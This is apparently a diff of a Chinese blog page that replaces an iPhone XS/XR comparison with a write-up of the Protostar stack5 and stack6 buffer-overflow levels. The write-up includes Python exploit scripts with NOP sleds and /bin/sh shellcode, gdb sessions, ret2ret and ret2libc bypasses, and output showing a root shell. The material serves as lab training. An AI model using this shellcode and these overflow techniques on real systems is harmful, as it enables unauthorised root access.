-</blockquote>
-<hr />
-<h1 id="屏幕">屏幕</h1>
-<p>emm</p>
-<p>其实并不是很不在乎这个&hellip;</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">64</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  gets(buffer);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><hr />
+<p>终于可以开始执行 shellcode 了，好耶w</p>
+<p>首先通过与上题一样的步骤，我们可以改函数的 Return Address</p>
+<p>想执行 shellcode 的简单思路就是：</p>
 <ol>
-<li>
-<p>因为用过很长时间的 Windows Phone 所以我个人偏向 OLED 因为黑色舒服</p>
-</li>
-<li>
-<p>其实不喜欢 iOS 的深色模式、只是因为我觉得看不清（或许是 6S 的问题</p>
-<p>所以其实 LCD 也无所谓</p>
-</li>
-<li>
-<p>不觉得 XR 1792×828 &amp; 326 ppi 的屏幕没法看</p>
-</li>
-<li>
-<p>XS 5.8 英寸，XR 6.1 英寸；其实我觉得都可</p>
-</li>
-<li>
-<p>XR 没有 3D Touch，但是我还是挺喜欢的</p>
-</li>
+<li>把 shellcode 写到栈上</li>
+<li>把 Return Address 指向写了 shellcode 的地方</li>
 </ol>
+<p>但是，由于环境变量等种种问题，很可能程序每次在栈上的地址都不太一样，</p>
+<p>这种情况可以在 shellcode 前填充大量的 NOP&hellip;这样的话不管 Return Address 指向了哪里，反正只要指向了这一大段冇用的 NOP 的话那么最终就能到达 shellcode</p>
+<p>NOP 的详细定义：</p>
 <blockquote>
-<p>结论</p>
-<p>XS 因为还有 3D Touch 所以 略微 优于 XR</p>
+<p>The NOP instruction does nothing. Execution continues with the next instruction. No registers or flags are affected by this instruction. NOP is typically used <strong>to generate a delay in execution or to reserve space in code memory</strong>.</p>
 </blockquote>
+<p>不过说起来，Hints 里提到过：</p>
+<blockquote>
+<p>If debugging the shellcode, use \xcc (int3) to stop the program executing and return to the debugger</p>
+</blockquote>
+<p>来看一下 <code>\xCC (int3)</code> 的定义：</p>
+<blockquote>
+<p>The INT3 instruction is a one-byte-instruction defined for use by debuggers to temporarily replace an instruction in a running program in order to set a code breakpoint.</p>
+</blockquote>
+<p>来试一下，首先找个地址来当 Return Address</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> disassemble main
+</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> main:
+</span></span><span style="display:flex;"><span>0x080483c4 &lt;main+0&gt;:	push   ebp
+</span></span><span style="display:flex;"><span>0x080483c5 &lt;main+1&gt;:	mov    ebp,esp
+</span></span><span style="display:flex;"><span>0x080483c7 &lt;main+3&gt;:	and    esp,0xfffffff0
+</span></span><span style="display:flex;"><span>0x080483ca &lt;main+6&gt;:	sub    esp,0x50
+</span></span><span style="display:flex;"><span>0x080483cd &lt;main+9&gt;:	lea    eax,<span style="color:#f92672">[</span>esp+0x10<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>0x080483d1 &lt;main+13&gt;:	mov    DWORD PTR <span style="color:#f92672">[</span>esp<span style="color:#f92672">]</span>,eax
+</span></span><span style="display:flex;"><span>0x080483d4 &lt;main+16&gt;:	call   0x80482e8 &lt;gets@plt&gt;
+</span></span><span style="display:flex;"><span>0x080483d9 &lt;main+21&gt;:	leave  
+</span></span><span style="display:flex;"><span>0x080483da &lt;main+22&gt;:	ret    
+</span></span><span style="display:flex;"><span>End of assembler dump.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> break *0x080483da
+</span></span><span style="display:flex;"><span>Breakpoint <span style="color:#ae81ff">1</span> at 0x80483da: file stack5/stack5.c, line 11.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> r
+</span></span><span style="display:flex;"><span>Starting program: /opt/protostar/bin/stack5 
+</span></span><span style="display:flex;"><span>Hello
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Breakpoint 1, 0x080483da in main <span style="color:#f92672">(</span>argc<span style="color:#f92672">=</span>134513604, argv<span style="color:#f92672">=</span>0x1<span style="color:#f92672">)</span> at stack5/stack5.c:11
+</span></span><span style="display:flex;"><span>11	stack5/stack5.c: No such file or directory.
+</span></span><span style="display:flex;"><span>	in stack5/stack5.c
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> x/24wx $esp
+</span></span><span style="display:flex;"><span>0xbffff79c:	0xb7eadc76	0x00000001	0xbffff844	0xbffff84c
+</span></span><span style="display:flex;"><span>0xbffff7ac:	0xb7fe1848	0xbffff800	0xffffffff	0xb7ffeff4
+</span></span><span style="display:flex;"><span>0xbffff7bc:	0x08048232	0x00000001	0xbffff800	0xb7ff0626
+</span></span><span style="display:flex;"><span>0xbffff7cc:	0xb7fffab0	0xb7fe1b28	0xb7fd7ff4	0x00000000
+</span></span><span style="display:flex;"><span>0xbffff7dc:	0x00000000	0xbffff818	0xf982f58c	0xd3d5c39c
+</span></span><span style="display:flex;"><span>0xbffff7ec:	0x00000000	0x00000000	0x00000000	0x00000001
+</span></span></code></pre></div><p>随便选一个&hellip;比如 <code>0xbffff7dc</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># stack5.py</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS&#34;</span>
+</span></span><span style="display:flex;"><span>return_address <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;I&#34;</span>, <span style="color:#ae81ff">0xbffff7dc</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">10</span>)
+</span></span><span style="display:flex;"><span>nop <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">300</span>
+</span></span><span style="display:flex;"><span>int3 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xCC\xCC\xCC\xCC</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print (padding <span style="color:#f92672">+</span> return_address <span style="color:#f92672">+</span> nop <span style="color:#f92672">+</span> int3)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 接下来 python stack5.py &gt; st5</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> r &lt; st5
+</span></span><span style="display:flex;"><span>Starting program: /opt/protostar/bin/stack5 &lt; st5
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Program received signal SIGTRAP, Trace/breakpoint trap.
+</span></span><span style="display:flex;"><span>0xbffff8cd in ?? <span style="color:#f92672">()</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> 
+</span></span></code></pre></div><p><code>Program received signal SIGTRAP, Trace/breakpoint trap.</code> 看起来是成功了</p>
+<p>接下来把 shellcode 也加进去吧，就用最开头的那个</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># stack5.py</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS&#34;</span>
+</span></span><span style="display:flex;"><span>return_address <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;I&#34;</span>, <span style="color:#ae81ff">0xbffff7dc</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">10</span>)
+</span></span><span style="display:flex;"><span>nop <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">300</span>
+</span></span><span style="display:flex;"><span>int3 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xCC\xCC\xCC\xCC</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68</span><span style="color:#e6db74">/tty</span><span style="color:#ae81ff">\x68</span><span style="color:#e6db74">/dev</span><span style="color:#ae81ff">\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68</span><span style="color:#e6db74">//sh</span><span style="color:#ae81ff">\x68</span><span style="color:#e6db74">/bin\x</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">89</span>\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 注意这里把 int3 去掉了</span>
+</span></span><span style="display:flex;"><span>print (padding <span style="color:#f92672">+</span> return_address <span style="color:#f92672">+</span> nop <span style="color:#f92672">+</span> shellcode)
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@protostar:/tmp$ python stack5.py | /opt/protostar/bin/stack5
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># whoami</span>
+</span></span><span style="display:flex;"><span>root
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># </span>
+</span></span></code></pre></div><p>完成w</p>
 <hr />
-<h1 id="杂项">杂项</h1>
-<ol>
-<li>双卡对我无所谓</li>
-<li>信号似乎 XR 略微好一点</li>
-<li>XR IP67，XS IP68，但我肯定不会闲的无聊往一两米深的水里丢x</li>
-<li>null</li>
-</ol>
+<h2 id="stack-six">Stack Six</h2>
+<blockquote>
+<p>Stack6 looks at what happens when you have restrictions on the return address.</p>
+<p>This level can be done in a couple of ways, such as finding the duplicate of the payload ( objdump -s will help with this), or ret2libc , or even return orientated programming.</p>
+<p>It is strongly suggested you experiment with multiple ways of getting your code to execute here.</p>
+<p>This level is at /opt/protostar/bin/stack6</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">getpath</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">64</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> ret;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  printf(<span style="color:#e6db74">&#34;input path please: &#34;</span>); fflush(stdout);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  gets(buffer);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  ret <span style="color:#f92672">=</span> __builtin_return_address(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>((ret <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xbf000000</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xbf000000</span>) {
+</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;bzzzt (%p)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, ret);
+</span></span><span style="display:flex;"><span>    _exit(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  printf(<span style="color:#e6db74">&#34;got path %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, buffer);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  getpath();
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>先看这部分：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>ret <span style="color:#f92672">=</span> __builtin_return_address(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>((ret <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xbf000000</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xbf000000</span>) {
+</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;bzzzt (%p)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, ret);
+</span></span><span style="display:flex;"><span>    _exit(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span></code></pre></div><p>有一个 <code>if((ret &amp; 0xbf000000) == 0xbf000000)</code> 的操作&hellip;简单来说相当于是如果 <code>ret</code> 以 <code>bf</code> 开头的话那么条件为真（结果就是<code>_exit(1)</code>）</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> break main
+</span></span><span style="display:flex;"><span>Breakpoint <span style="color:#ae81ff">1</span> at 0x8048500: file stack6/stack6.c, line 27.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> r
+</span></span><span style="display:flex;"><span>Starting program: /opt/protostar/bin/stack6 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Breakpoint 1, main <span style="color:#f92672">(</span>argc<span style="color:#f92672">=</span>1, argv<span style="color:#f92672">=</span>0xbffff844<span style="color:#f92672">)</span> at stack6/stack6.c:27
+</span></span><span style="display:flex;"><span>27	stack6/stack6.c: No such file or directory.
+</span></span><span style="display:flex;"><span>	in stack6/stack6.c
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> info proc map
+</span></span><span style="display:flex;"><span>process <span style="color:#ae81ff">5679</span>
+</span></span><span style="display:flex;"><span>cmdline <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/opt/protostar/bin/stack6&#39;</span>
+</span></span><span style="display:flex;"><span>cwd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/tmp&#39;</span>
+</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/opt/protostar/bin/stack6&#39;</span>
+</span></span><span style="display:flex;"><span>Mapped address spaces:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	Start Addr   End Addr       Size     Offset objfile
+</span></span><span style="display:flex;"><span>	 0x8048000  0x8049000     0x1000          <span style="color:#ae81ff">0</span>        /opt/protostar/bin/stack6
+</span></span><span style="display:flex;"><span>	 0x8049000  0x804a000     0x1000          <span style="color:#ae81ff">0</span>        /opt/protostar/bin/stack6
+</span></span><span style="display:flex;"><span>	0xb7e96000 0xb7e97000     0x1000          <span style="color:#ae81ff">0</span>        
+</span></span><span style="display:flex;"><span>	0xb7e97000 0xb7fd5000   0x13e000          <span style="color:#ae81ff">0</span>         /lib/libc-2.11.2.so
+</span></span><span style="display:flex;"><span>	0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
+</span></span><span style="display:flex;"><span>	0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
+</span></span><span style="display:flex;"><span>	0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
+</span></span><span style="display:flex;"><span>	0xb7fd9000 0xb7fdc000     0x3000          <span style="color:#ae81ff">0</span>        
+</span></span><span style="display:flex;"><span>	0xb7fe0000 0xb7fe2000     0x2000          <span style="color:#ae81ff">0</span>        
+</span></span><span style="display:flex;"><span>	0xb7fe2000 0xb7fe3000     0x1000          <span style="color:#ae81ff">0</span>           <span style="color:#f92672">[</span>vdso<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>	0xb7fe3000 0xb7ffe000    0x1b000          <span style="color:#ae81ff">0</span>         /lib/ld-2.11.2.so
+</span></span><span style="display:flex;"><span>	0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
+</span></span><span style="display:flex;"><span>	0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
+</span></span><span style="display:flex;"><span>	0xbffeb000 0xc0000000    0x15000          <span style="color:#ae81ff">0</span>           <span style="color:#f92672">[</span>stack<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> 
+</span></span></code></pre></div><p>可见 <code>0xbffeb000 - 0xc0000000</code> 都是栈&hellip;</p>
+<p>那么就变成了：「只要 <code>ret</code> 指向栈上的某个地址，那么就会 <code>_exit(1)</code>」</p>
 <hr />
-<h1 id="总结">总结</h1>
-<p>没想好&hellip;</p>
-<p>或许对我来说 XS..?</p>
-<p>再不行我就抛个硬币让命运石之门帮我决定得了ww</p>
+<h3 id="exploit-0--ret2ret">exploit #0 : ret2ret</h3>
+<p>瞎取的名字x</p>
+<p>即，虽然它会检查 ret 要返回到的地址会不会被修改到栈上&hellip;</p>
+<p>但如果 ret 到自己呢&hellip;</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> disassemble getpath
+</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> getpath:
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 省略一部分</span>
+</span></span><span style="display:flex;"><span>0x080484c2 &lt;getpath+62&gt;:	jne    0x80484e4 &lt;getpath+96&gt;
+</span></span><span style="display:flex;"><span>0x080484c4 &lt;getpath+64&gt;:	mov    eax,0x80485e4
+</span></span><span style="display:flex;"><span>0x080484c9 &lt;getpath+69&gt;:	mov    edx,DWORD PTR <span style="color:#f92672">[</span>ebp-0xc<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>0x080484cc &lt;getpath+72&gt;:	mov    DWORD PTR <span style="color:#f92672">[</span>esp+0x4<span style="color:#f92672">]</span>,edx
+</span></span><span style="display:flex;"><span>0x080484d0 &lt;getpath+76&gt;:	mov    DWORD PTR <span style="color:#f92672">[</span>esp<span style="color:#f92672">]</span>,eax
+</span></span><span style="display:flex;"><span>0x080484d3 &lt;getpath+79&gt;:	call   0x80483c0 &lt;printf@plt&gt;
+</span></span><span style="display:flex;"><span>0x080484d8 &lt;getpath+84&gt;:	mov    DWORD PTR <span style="color:#f92672">[</span>esp<span style="color:#f92672">]</span>,0x1
+</span></span><span style="display:flex;"><span>0x080484df &lt;getpath+91&gt;:	call   0x80483a0 &lt;_exit@plt&gt;
+</span></span><span style="display:flex;"><span>0x080484e4 &lt;getpath+96&gt;:	mov    eax,0x80485f0
+</span></span><span style="display:flex;"><span>0x080484e9 &lt;getpath+101&gt;:	lea    edx,<span style="color:#f92672">[</span>ebp-0x4c<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>0x080484ec &lt;getpath+104&gt;:	mov    DWORD PTR <span style="color:#f92672">[</span>esp+0x4<span style="color:#f92672">]</span>,edx
+</span></span><span style="display:flex;"><span>0x080484f0 &lt;getpath+108&gt;:	mov    DWORD PTR <span style="color:#f92672">[</span>esp<span style="color:#f92672">]</span>,eax
+</span></span><span style="display:flex;"><span>0x080484f3 &lt;getpath+111&gt;:	call   0x80483c0 &lt;printf@plt&gt;
+</span></span><span style="display:flex;"><span>0x080484f8 &lt;getpath+116&gt;:	leave
+</span></span><span style="display:flex;"><span>0x080484f9 &lt;getpath+117&gt;:	ret    
+</span></span><span style="display:flex;"><span>End of assembler dump.
+</span></span></code></pre></div><p>比如 <code>0x080484f9 &lt;getpath+117&gt;:	ret</code> 这里会被检查是否 ret 到了栈上
+但如果 ret 到自己（<code>0x080484f9 &lt;getpath+117&gt;</code>）的话，那接下来这一次 ret 要到的地址就不会被检查&hellip;</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#stack6_0.py</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPUUUURRRRSSSSTTTT&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 第一次 ret 到 0x080484f9 也就是 ret 自己所处的地址</span>
+</span></span><span style="display:flex;"><span>ret_first_time <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;I&#34;</span>, <span style="color:#ae81ff">0x080484f9</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 第二次 ret 到栈上随便某个地方</span>
+</span></span><span style="display:flex;"><span>ret_second_time <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;I&#34;</span>, <span style="color:#ae81ff">0xbffff7dc</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">30</span>)
+</span></span><span style="display:flex;"><span>nop <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">300</span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68</span><span style="color:#e6db74">/tty</span><span style="color:#ae81ff">\x68</span><span style="color:#e6db74">/dev</span><span style="color:#ae81ff">\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68</span><span style="color:#e6db74">//sh</span><span style="color:#ae81ff">\x68</span><span style="color:#e6db74">/bin</span><span style="color:#ae81ff">\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print (padding <span style="color:#f92672">+</span> ret_first_time <span style="color:#f92672">+</span> ret_second_time <span style="color:#f92672">+</span> nop <span style="color:#f92672">+</span> shellcode)
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@protostar:/tmp$ python stack6_0.py | /opt/protostar/bin/stack6
+</span></span><span style="display:flex;"><span>input path please: got path AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP?RRRRSSSSTTTT?????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀Sh/ttyh/dev??1?f?<span style="color:#960050;background-color:#1e0010">&#39;</span>?̀1?Ph//shh/bin??PS?ᙰ
+</span></span><span style="display:flex;"><span>                       ̀
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># whoami</span>
+</span></span><span style="display:flex;"><span>root
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># </span>
+</span></span></code></pre></div><hr />
+<h3 id="exploit-1--ret2libc">exploit #1 : ret2libc</h3>
+<blockquote>
+<p>A Ret2libC attack allows <strong>us to call the C function system and a function called exit in order to spawn a shell and thereafter allow the program to exit cleanly without arousing any suspicion</strong>.</p>
+</blockquote>
+<p>既然想执行 <code>/bin/sh</code> 的话，首先得调用 <code>system</code></p>
+<pre tabindex="0"><code>(gdb) p system
+$1 = {&lt;text variable, no debug info&gt;} 0xb7ecffb0 &lt;__libc_system&gt;
+</code></pre><p>然后找找 <code>/bin/sh</code> 在哪</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@protostar:/tmp$ strings -a -t x /lib/libc-2.11.2.so | grep <span style="color:#e6db74">&#34;/bin/sh&#34;</span>
+</span></span><span style="display:flex;"><span> 11f3bf /bin/sh
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> info proc map
+</span></span><span style="display:flex;"><span>process <span style="color:#ae81ff">5972</span>
+</span></span><span style="display:flex;"><span>cmdline <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/opt/protostar/bin/stack6&#39;</span>
+</span></span><span style="display:flex;"><span>cwd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/tmp&#39;</span>
+</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/opt/protostar/bin/stack6&#39;</span>
+</span></span><span style="display:flex;"><span>Mapped address spaces:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	Start Addr   End Addr       Size     Offset objfile
+</span></span><span style="display:flex;"><span>	 0x8048000  0x8049000     0x1000          <span style="color:#ae81ff">0</span>        /opt/protostar/bin/stack6
